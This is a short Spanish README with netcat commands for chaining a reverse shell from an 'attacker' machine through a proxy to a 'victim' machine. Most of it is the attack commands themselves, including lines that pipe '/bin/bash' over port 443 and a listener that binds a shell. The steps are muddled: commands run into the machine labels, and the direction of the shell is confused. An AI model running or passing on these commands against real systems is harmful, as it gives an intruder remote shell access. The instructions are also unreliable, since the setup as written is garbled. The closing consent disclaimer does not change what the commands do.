# README - Configuración de Reverse Shell a través de Proxy
Este README proporciona instrucciones sobre cómo configurar una reverse shell desde una máquina atacante a través de un proxy hacia una máquina final.

# Configuración Máquinas involucradas:
  - Máquina atacante: (IP atacante)
  - Proxy: (IP proxy)
  - Máquina final: (IP víctima)

# Pasos para la configuración:
1. Máquina atacante (IP atacante):

2. Ejecuta el siguiente comando para establecer una conexión a través del proxy y enviar la shell inversa:
- nc -e /bin/bash (IP proxy) 443 | nc -v (IP víctima) 443 Proxy ((IP proxy)):

# Ejecuta el siguiente comando para escuchar en el puerto 443 y redirigir el tráfico entrante a la máquina final:

- nc -lvp 443 | nc -v (IP víctima) 443 Máquina final ((IP víctima)):

# Configura un listener para recibir la conexión entrante en el puerto 443:

- nc -lvp 443  -e /bin/bash
- 
# Notas importantes:
Asegúrate de tener permisos adecuados y contar con el consentimiento del propietario del sistema antes de realizar este tipo de acciones.
La seguridad ética y responsable es esencial en todas las actividades relacionadas con la seguridad informática.
